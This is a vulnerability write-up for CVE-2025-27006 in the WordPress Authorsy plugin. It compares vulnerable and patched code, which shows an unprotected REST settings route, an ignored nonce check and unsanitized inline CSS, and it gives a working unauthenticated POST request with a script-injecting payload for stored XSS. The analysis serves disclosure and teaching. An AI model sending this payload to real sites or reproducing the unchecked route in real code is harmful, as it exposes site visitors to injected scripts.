---

title: CVE-2025-27006 Analysis & POC
description: Security Vulnerability in WordPress Authorsy Plugin.
date: 2025-09-17 10:37:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, plugin, xss]

---

## Introduction

A vulnerability exists in the WordPress **Authorsy** plugin before version **1.0.6**. This can allow an attacker to inject malicious code (e.g., redirect scripts, ads, or other HTML payloads) into the website, which will be executed when a visitor opens the page.

* **CVE ID**: [CVE-2025-27006](https://www.cve.org/CVERecord?id=CVE-2025-27006)
* **Product**: [WordPress Authorsy Plugin](https://wordpress.org/plugins/authorsy/)
* **Vulnerability Type**: Cross Site Scripting
* **Affected Versions**: <= 1.0.5
* **CVSS severity**: Medium (6.5)
* **OWASP Top 10**: A1: Broken Access Control
* **Required Privilege**: Subscriber

> The description requires **Subscriber** privileges, but in reality, the vulnerability can be exploited **unauthenticated**.

---

## Requirements

* [**Local WordPress and Debugging**](https://w41bu1.github.io/posts/wordpress-local-and-debugging/)
* **Authorsy**: v1.0.5 (vulnerable) and v1.0.6 (patched)
* **Diff tool**: **meld** or any tool to compare differences between versions

---

## Analysis

The plugin provides a custom CSS feature, stores data in `wp_options`, and inserts it directly into `<style>` on the page. However, users can interact with the API to modify CSS data without proper permission checks, leading to **Broken Access Control** and potential **XSS** if malicious payloads are inserted.

### Patch Diff

Use any diff tool to compare the vulnerable version with the patched version.
The main differences are in **core/settings/api-settings.php** and **core/enqueue-inline/enqueue-inline.php**.

**File: core/enqueue-inline/enqueue-inline.php (v1.0.5)**

```php
public function custom_inline_css()
{
    $custom_css  = '';
    // other logic
    $ea_custom_css = authorsy_get_option('ea_custom_css');
    if(is_single()){
        $custom_css.= $ea_custom_css;
    }
    
    $custom_css .= "
    :root { 
        --ea-color-main: $primary_color;  
    }
    // other custom
    "
    wp_add_inline_style('authorsy-custom-css', $custom_css);
}
```

User input is added directly into HTML without any protection, making it **XSS-prone**.

**Patched version:**

```php
public function custom_inline_css()
{
    $custom_css  = '';
    // other logic
    $ea_custom_css = authorsy_get_option('ea_custom_css');
    if(is_single() && !empty($ea_custom_css)){
        // Additional sanitization for output to prevent XSS
        $ea_custom_css = wp_strip_all_tags($ea_custom_css);
        $ea_custom_css = esc_html($ea_custom_css);
        $custom_css.= $ea_custom_css;
    }
    
    $custom_css .= "
    :root { 
        --ea-color-main: $primary_color;  
    }
    // other custom
    "
    wp_add_inline_style('authorsy-custom-css', $custom_css);
}
```

The patch sanitizes and escapes user data, and ensures CSS exists before inserting.

![diff 1](images/posts/2025-09-17-CVE-2025-27006/diff1.png)

**File: core/settings/api-settings.php (v1.0.5)**

```php
class Api_Settings extends Api {
    protected $namespace = 'authorsy/v1';
    protected $rest_base = 'settings';

    public function register_routes() {
        register_rest_route(
            $this->namespace, $this->rest_base, [
                [
                    'methods'             => \WP_REST_Server::READABLE,
                    'callback'            => [$this, 'get_settings'],
                    'permission_callback' => function () {
                        return true;
                    },
                ],
                [
                    'methods'             => \WP_REST_Server::EDITABLE,
                    'callback'            => [$this, 'update_settings'],
                    'permission_callback' => function () {
                        return true;
                    },
                ],
            ]
        );
    }

    public function get_settings() {
        // other logic
    }

    public function update_settings( $request ) {
       // other logic
    }
}
```

The REST API is registered using `register_rest_route`, but **permission checks are missing** (`permission_callback` always returns `true`), allowing anyone to use the API.

**Patched version:**

```php
class Api_Settings extends Api {
    protected $namespace = 'authorsy/v1';
    protected $rest_base = 'settings';

    public function register_routes() {
        register_rest_route(
            $this->namespace, $this->rest_base, [
                [
                    'methods'             => \WP_REST_Server::READABLE,
                    'callback'            => [$this, 'get_settings'],
                    'permission_callback' => function () {
                        return current_user_can('manage_options');
                    },
                ],
                [
                    'methods'             => \WP_REST_Server::EDITABLE,
                    'callback'            => [$this, 'update_settings'],
                    'permission_callback' => function () {
                        return current_user_can('manage_options');
                    },
                ],
            ]
        );
    }

    public function get_settings() {
        // other logic
    }

    public function update_settings( $request ) {
       // other logic
    }
}
```

The `permission_callback` now restricts access to **admins**, preventing **Broken Access Control** and indirectly reducing **XSS** risk.

![diff 2](images/posts/2025-09-17-CVE-2025-27006/diff2.png)

---

### How It Works

```php
class Enqueue_Inline
{
    public function init()
    {
        add_action('wp_head', array($this, 'custom_inline_css'));
    }
    // other logic
    public function custom_inline_css()
    {
        $custom_css  = '';
        // other logic
        $primary_color = authorsy_get_option('primary_color');
        $ea_custom_css = authorsy_get_option('ea_custom_css');
        if(is_single()){
            $custom_css.= $ea_custom_css;
        }
     
        $custom_css .= "
        :root { 
            --ea-color-main: $primary_color;  
        }
        // other custom
        "
        wp_add_inline_style('authorsy-custom-css', $custom_css);
    }
}
```

The `custom_inline_css` function is hooked to [`wp_head`](https://developer.wordpress.org/reference/hooks/wp_head/). When WordPress renders the `<head>` section, this function adds the CSS inline.

`$custom_css` contains plugin configuration variables retrieved via `authorsy_get_option()` and other logic. These are concatenated and added to `<head>` with `wp_add_inline_style()`.

```php
function authorsy_get_option( $key = '', $default = false ) {
    $options = get_option( 'authorsy_settings' );
    $value   = $default;

    if ( isset( $options[$key] ) ) {
        $value = ! empty( $options[$key] ) ? $options[$key] : $default;
    }

    return $value;
}
```

`authorsy_get_option` fetches all plugin options stored in `wp_options` (`get_option('authorsy_settings')`). It then checks if the key exists, returning the stored value or the default.

ðŸ‘‰ Since the data is stored and then rendered, this is **Stored XSS**.

---

Accessing `/wp-json/authorsy/v1/settings` with **POST** calls `update_settings` without privilege checks:

```php
public function update_settings( $request ) {
    $options = json_decode( $request->get_body(), true );

    $this->verify_nonce( $request );

    $data = [
        'status_code' => 200,
        'success'     => 1,
        'message'     => esc_html__( 'Settings successfully updated', 'authorsy' ),
        'data'        => authorsy_get_settings(),
    ];

    if ( $options ) {
        foreach ( $options as $key => $value ) {
            authorsy_update_option( $key, $value );
        }
    }

    $data['data'] = authorsy_get_settings();

    return rest_ensure_response( $data );
}
```

`update_settings` receives JSON key-value pairs and updates them in the database. Before updating, it calls `$this->verify_nonce( $request );`:

```php
public static function verify_nonce($request) {
    $nonce = $request->get_header('X-WP-Nonce');

    if (!wp_verify_nonce($nonce, 'wp_rest')) {
        return new \WP_Error('invalid_nonce', __('Invalid nonce.', 'authorsy'), ['status' => 403]);
    }

    return true;
}
```

Key points:

* If **nonce** is invalid, it only returns a `WP_Error` but does not stop execution.
* `update_settings` ignores the return value, so the update proceeds anyway.

ðŸ‘‰ Therefore, an attacker can modify CSS containing XSS payload in the database **without any privilege**. This CSS is injected into `<head>`.

---

## Exploit

### Detect XSS

Send a **POST** request to `/wp-json/authorsy/v1/settings` with an XSS payload:

```http
POST /wp-json/authorsy/v1/settings HTTP/1.1
Host: localhost
Content-Type: application/json

{
"primary_color":"</style><script>alert(document.domain)</script><style>"
}
```

We close the `<style>` tag in the head and inject a `<script>` containing the XSS payload.

Access any page:

![XSS](images/posts/2025-09-17-CVE-2025-27006/xss.png)

ðŸ‘‰ XSS succeeds. Inspect shows the modified code:

```html
<style>
    :root { 
        --ea-color-main: </style><script>alert(document.domain)</script><style>;  
    } 
</style>
```

---

## Conclusion

The `CVE-2025-27006` vulnerability in **Authorsy <= 1.0.5** is a typical example of **Broken Access Control** combined with **XSS**. Causes:

1. **REST API** lacks permission checks: any user can call `/wp-json/authorsy/v1/settings` to modify options.
2. **Custom CSS** is not sanitized: CSS values are inserted directly into `<style>` in `<head>`, allowing script injection.
3. Nonce handling is flawed: `verify_nonce` only returns a **WP\_Error** without stopping execution, making the check ineffective.

**Key takeaways**:

* REST APIs must enforce proper permission checks with `permission_callback` to prevent **Broken Access Control**.
* Always sanitize user input before rendering in HTML/CSS/JS to prevent **XSS**.

---

## References

[Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[WordPress Authorsy Plugin <= 1.0.5 is vulnerable to Cross Site Scripting (XSS)](https://patchstack.com/database/wordpress/plugin/authorsy/vulnerability/wordpress-authorsy-plugin-1-0-5-cross-site-scripting-xss-vulnerability)